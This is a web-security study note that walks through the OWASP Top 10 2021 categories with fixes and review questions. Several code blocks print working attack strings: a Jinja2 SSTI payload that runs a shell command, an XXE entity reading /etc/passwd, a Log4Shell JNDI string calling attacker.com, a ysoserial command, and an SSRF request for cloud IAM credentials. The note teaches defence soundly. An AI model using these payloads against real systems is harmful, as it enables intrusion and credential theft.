# 🔟 OWASP Top 10 2021

> [!abstract] TL;DR
> The OWASP Top 10 2021 is the definitive web application security risk ranking, updated from 2017 with three new categories. A01 Broken Access Control (moved up from #5) affects 94% of tested applications with IDOR and privilege escalation as primary patterns — deny-by-default is the architectural fix. A02 Cryptographic Failures covers cleartext data and weak algorithms. A03 Injection (down from #1) combines SQL injection and XSS. A06 Vulnerable Components captures Log4Shell (CVE-2021-44228, CVSS 10.0), the highest-impact supply chain vulnerability in history. A08 Insecure Deserialization covers the SolarWinds vector. A10 SSRF is the newest entry, covering cloud metadata endpoint abuse (169.254.169.254).

---

## Intuition — Analogy First

The OWASP Top 10 is the periodic table of web security: a structured, evidence-based ranking of the most commonly exploited vulnerability classes across the web. The 2021 update reflects a shift in the threat landscape — access control failures (developers forgetting to check permissions) now surpass injection (developers failing to sanitise input) because modern frameworks handle the latter but not the former.

The ranking is calculated from real-world testing data: the 2021 list used data from 500,000+ applications tested by security firms worldwide. A01 "affects 94% of applications" means 94 out of 100 applications tested have at least one access control failure — not that 94% are catastrophically broken.

---

## How It Works

```mermaid
graph TD
    OWASP["OWASP Top 10 2021"]
    OWASP --> A01["A01 Broken Access Control\n94% of apps affected\nIDOR · Privilege Escalation"]
    OWASP --> A02["A02 Cryptographic Failures\nCleartext · Weak algos · No TLS"]
    OWASP --> A03["A03 Injection\nSQL · XSS · Command Injection"]
    OWASP --> A04["A04 Insecure Design\nNew 2021 · Missing threat model"]
    OWASP --> A05["A05 Security Misconfiguration\nXXE · Default creds · Verbose errors"]
    OWASP --> A06["A06 Vulnerable Components\nLog4Shell CVE-2021-44228"]
    OWASP --> A07["A07 Auth Failures\nBrute force · Weak passwords · No MFA"]
    OWASP --> A08["A08 Software/Data Integrity\nDeserialization · CI/CD tampering"]
    OWASP --> A09["A09 Logging/Monitoring Failures\nNo audit trail · Late detection"]
    OWASP --> A10["A10 SSRF\nNew 2021 · 169.254.169.254 metadata"]

    style A01 fill:#e94560,color:#fff
    style A06 fill:#e94560,color:#fff
    style A10 fill:#f5a623,color:#111
    style A04 fill:#f5a623,color:#111
```



---

## Key Concepts / Details

### A01 — Broken Access Control (Most Critical)

94% of applications tested had some form of broken access control. Key patterns:

**IDOR (Insecure Direct Object Reference)**:
```http
GET /api/users/1234/documents/5678  ← attacker changes 1234 to 5679
Authorization: Bearer <token_for_user_1234>
```
Server returns documents belonging to user 5679 without verifying that the requestor owns those documents.

**Fix — deny-by-default**:
```python
# BAD: Fetch resource, then check ownership
def get_document(user_id, doc_id):
    doc = db.get_document(doc_id)  # Fetches any document
    if doc.owner != user_id:
        return 403  # Access denied (but object was already fetched)

# GOOD: Query scoped to user_id from authenticated session
def get_document(user_id, doc_id):
    doc = db.query("SELECT * FROM docs WHERE id=? AND owner=?", doc_id, user_id)
    if not doc:
        return 404  # Neither confirms nor denies existence
```

**Privilege escalation via parameter manipulation**:
```http
POST /api/user/update
{"userId": 1234, "role": "admin"}  ← user adds role: admin field
```

### A02 — Cryptographic Failures

- Cleartext transmission (HTTP instead of HTTPS for sensitive data)
- Weak algorithms: MD5/SHA-1 for password hashing, DES/3DES for data encryption
- Hardcoded cryptographic keys in source code (GitHub scanner finds these daily)
- Missing `Secure` flag on session cookies (transmitted over HTTP)
- Insufficient key length (RSA-1024 deprecated; minimum RSA-2048)

Fix: AES-256-GCM for encryption, Argon2id/bcrypt for passwords, TLS 1.3 for transport.

### A03 — Injection (Includes XSS)

Merged from separate A03 (SQL injection) and A07 (XSS) in 2017. Includes:
- SQL injection: parameterized queries fix; see [[SQL_and_NoSQL_Injection]]
- Cross-site scripting: output encoding, CSP; see [[XSS_and_CSRF]]
- Command injection: `os.system(user_input)` pattern
- LDAP injection, XPath injection, template injection (SSTI)

**SSTI Example** (Server-Side Template Injection):
```
# Jinja2 (Python Flask)
GET /page?name={{7*7}}
Response: "Hello 49"  ← template evaluated the expression
# RCE payload:
GET /page?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

### A05 — Security Misconfiguration (includes XXE)

**XXE (XML External Entity) Injection**:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
```
If the XML parser processes external entities, it reads `/etc/passwd` and includes it in the response.

Fix: Disable external entity processing:
```java
// Java: disable XXE in DocumentBuilderFactory
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

### A06 — Vulnerable and Outdated Components — Log4Shell

**CVE-2021-44228 (Log4Shell)** — CVSS 10.0:

Log4j 2.x (2.0-beta9 to 2.14.1) performs JNDI lookups when it logs strings containing `${jndi:...}`.

```
# Attack payload in any HTTP header (User-Agent, X-Forwarded-For, etc.)
User-Agent: ${jndi:ldap://attacker.com/exploit}

# Log4j logs the User-Agent, triggering LDAP lookup to attacker's server
# Attacker's LDAP server returns a reference to a malicious Java class
# Log4j downloads and executes the class → RCE
```

Impact: Anything using Log4j 2.x was vulnerable, including Minecraft, Apache Solr, VMware, Cisco, AWS services.

Fix: Upgrade Log4j to 2.17.1+; or set `log4j2.formatMsgNoLookups=true`; or use SBOM/SCA to find all Log4j versions.

### A08 — Software and Data Integrity Failures

Covers:
- **Insecure deserialization**: Deserializing untrusted data executes code via gadget chains
- **CI/CD pipeline tampering**: SolarWinds SUNBURST backdoor inserted into build pipeline

**SolarWinds Attack (2020)**: APT29 compromised SolarWinds' build system, inserting SUNBURST malware into Orion software updates. ~18,000 organisations installed the backdoored update.

**Java deserialization gadget chain example (CVE-2015-4852)**:
```bash
# ysoserial: Java deserialization exploit generator
java -jar ysoserial.jar CommonsCollections1 "calc.exe" > payload.ser
# Sending payload.ser to a vulnerable Java endpoint triggers calc.exe execution
```

Fix: Never deserialize untrusted data; use JSON instead of Java serialization; implement deserialization allowlists.

### A10 — SSRF (Server-Side Request Forgery) — New in 2021

Server-Side Request Forgery: the server fetches a URL specified by the attacker.

```http
POST /api/fetch-preview
{"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```

In AWS/Azure/GCP, the IMDS (Instance Metadata Service) at `169.254.169.254` returns IAM credentials with no authentication from within the cloud instance. SSRF allows an attacker to steal cloud credentials.

Capital One breach (2019): SSRF via misconfigured WAF → IMDSv1 credential theft → S3 bucket exfiltration of 100M+ customer records.

Fix: AWS IMDSv2 (requires PUT token first, preventing SSRF exploitation), network-level SSRF prevention (block egress to 169.254.x.x, 10.x.x.x ranges from application tier).

---

## Real-World Notes

- OWASP Top 10 is not a checklist — passing all 10 doesn't mean you're secure. It's a minimum baseline.
- A04 Insecure Design (new 2021) reflects that many vulnerabilities are design-level, not implementation-level — no amount of secure coding fixes a broken threat model
- 60% of web application breaches involve at least one Top 10 category (Verizon DBIR 2023)
- Bug bounty payouts for SSRF+IMDS chains are typically $10,000–$50,000 on HackerOne; Log4Shell found in 93% of cloud environments at disclosure

---

## Common Pitfalls

1. **Fixing symptoms not causes** — Adding input validation for one SQLi endpoint doesn't fix the architectural absence of parameterized queries everywhere
2. **WAF as OWASP Top 10 solution** — WAFs help but are not a fix; sophisticated attackers bypass WAF rules routinely
3. **A09 logging as afterthought** — Most breaches go undetected for 200+ days; logging/monitoring failures are what extend dwell time
4. **Ignoring A04 Insecure Design** — Threat modeling at design time is the only way to catch design-level vulnerabilities

---

## Related Concepts

- [[XSS_and_CSRF|→ XSS & CSRF]] — A03 cross-site scripting detail
- [[SQL_and_NoSQL_Injection|→ SQL Injection]] — A03 injection detail
- [[JWT_and_OAuth|→ JWT & OAuth]] — A07 authentication failures
- [[API_Security|→ API Security]] — API-specific OWASP Top 10 overlap
- [[_MOC_Web_Security|↑ Web Security MOC]]

---

## Review Questions

1. A developer argues that their application is safe from A01 because "only authenticated users can access the API." Explain why authentication and authorisation are separate concerns using a concrete IDOR example.
2. Your Java application uses Log4j 2.12.0. Describe three independent mitigations you can apply immediately, ordered by effectiveness and deployment risk.
3. Design an SSRF prevention strategy for a feature that must allow users to submit URLs for thumbnail generation. What network controls, URL validation, and application-layer controls are needed?

---

## Sources

- OWASP Top 10 2021: https://owasp.org/Top10/
- Log4Shell Technical Details: https://www.lunasec.io/docs/blog/log4j-zero-day/
- Capital One SSRF Breach: https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/

#Cybersecurity #WebSecurity #OWASP #Log4Shell #SSRF #BrokenAccessControl
